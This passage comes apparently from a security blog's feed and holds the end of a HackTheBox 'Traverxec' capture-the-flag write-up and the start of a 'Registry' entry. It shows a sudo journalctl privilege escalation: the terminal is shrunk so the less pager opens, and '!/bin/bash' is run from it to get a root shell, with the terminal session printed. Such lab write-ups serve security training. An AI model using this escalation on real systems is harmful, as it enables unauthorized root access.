+&lt;span class="code-line"&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;cat /home/david/bin/server-stats.head&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Load: `/usr/bin/uptime`&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Open nhttpd sockets: `/usr/bin/ss -H sport = 80 | /usr/bin/wc -l`&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Files in the docroot: `/usr/bin/find /var/nostromo/htdocs/ | /usr/bin/wc -l`&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; &amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Last 5 journal log lines:&amp;quot;&lt;/span&gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service &lt;span class="p"&gt;|&lt;/span&gt; /usr/bin/cat&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;The interesting part is the last line. This mean that we have the &lt;code&gt;sudo&lt;/code&gt;
+permissions as &lt;code&gt;root&lt;/code&gt; with no password (as it is in a script).
+The &lt;code&gt;sudo&lt;/code&gt; rights are well designed, we cannot change any argument in the line.
+If we look at
+&lt;a href="https://gtfobins.github.io/gtfobins/journalctl/"&gt;gtfobins for journalctl&lt;/a&gt; we
+see that the interesting part is to get the pager (which by default is &lt;code&gt;less&lt;/code&gt;,
+which allow to run bash command with &lt;code&gt;!&lt;/code&gt;).&lt;/p&gt;
+&lt;p&gt;As the command specifiecaly allow us to only have 5 lines from the &lt;code&gt;journalctl&lt;/code&gt;
+output what we need to do is to get a tiny tiny windows to trigger the pager.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Tiny window in order to trigger the pager" src="/media/2020.04/traverxec_3.png"&gt;&lt;/p&gt;
+&lt;p&gt;From &lt;code&gt;less&lt;/code&gt; we are able to run a bash command as &lt;code&gt;/bin/bash/&lt;/code&gt;.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Running a bash command from less" src="/media/2020.04/traverxec_4.png"&gt;&lt;/p&gt;
+&lt;p&gt;We then get a root shell and are able to get the flag.&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span class="code-line"&gt;&lt;span&gt;&lt;/span&gt;&lt;code&gt;david@traverxec:~$ /usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service&lt;/span&gt;
+&lt;span class="code-line"&gt;-- Logs begin at Wed 2019-11-27 05:44:37 EST, end at Wed 2019-11-27 06:15:38 EST&lt;/span&gt;
+&lt;span class="code-line"&gt;Nov 27 06:11:16 traverxec crontab[4166]: (www-data) LIST (www-data)&lt;/span&gt;
+&lt;span class="code-line"&gt;Nov 27 06:12:32 traverxec sudo[4554]: pam_unix(sudo:auth): authentication failur&lt;/span&gt;
+&lt;span class="code-line"&gt;...skipping...&lt;/span&gt;
+&lt;span class="code-line"&gt;Nov 27 06:12:41 traverxec sudo[4554]: www-data : user NOT in sudoers ; TTY=pts/1&lt;/span&gt;
+&lt;span class="code-line"&gt;Nov 27 06:13:05 traverxec su[4567]: pam_unix(su:auth): authentication failure; l&lt;/span&gt;
+&lt;span class="code-line"&gt;Nov 27 06:13:07 traverxec su[4567]: FAILED SU (to david) www-data on pts/6&lt;/span&gt;
+&lt;span class="code-line"&gt;!/bin/bash&lt;/span&gt;
+&lt;span class="code-line"&gt;root@traverxec:/home/david# cat /root/root.txt&lt;/span&gt;
+&lt;span class="code-line"&gt;9aa36a6&amp;lt;redacted&amp;gt;&lt;/span&gt;
+&lt;span class="code-line"&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;h1 id="wrapping-up"&gt;Wrapping up&lt;/h1&gt;
+&lt;p&gt;This box is quit easy. The revershell is quit quick. The privilege escalation to
+user might a pain as there is some rabbit holes (like this &lt;code&gt;Nowonly4me&lt;/code&gt;
+password) and the root part is quit CTFish but quick.&lt;/p&gt;</content><category term="security"></category><category term="security"></category><category term="boot2root"></category><category term="HTB"></category><category term="linux"></category><category term="nostromo"></category><category term="journalctl"></category></entry><entry><title>HTB: Registry</title><link href="https://maggick.fr/2020/04/htb-registry.html" rel="alternate"></link><published>2020-04-04T19:40:00+02:00</published><updated>2020-04-04T19:40:00+02:00</updated><author><name>maggick</name></author><id>tag:maggick.fr,2020-04-04:/2020/04/htb-registry.html</id><summary type="html">&lt;p&gt;&lt;img alt="Jarvis Card" class="align-left" src="/media/2020.04/registry_card.png" width="262"/&gt;&lt;/p&gt;
 &lt;p&gt;This box is a writeup about a retired HacktheBox machine:
 &lt;a href="https://www.hackthebox.eu/home/machines/profile/213"&gt;Registry&lt;/a&gt;.
 This box is rated as a hard box. It was release on October 19 by
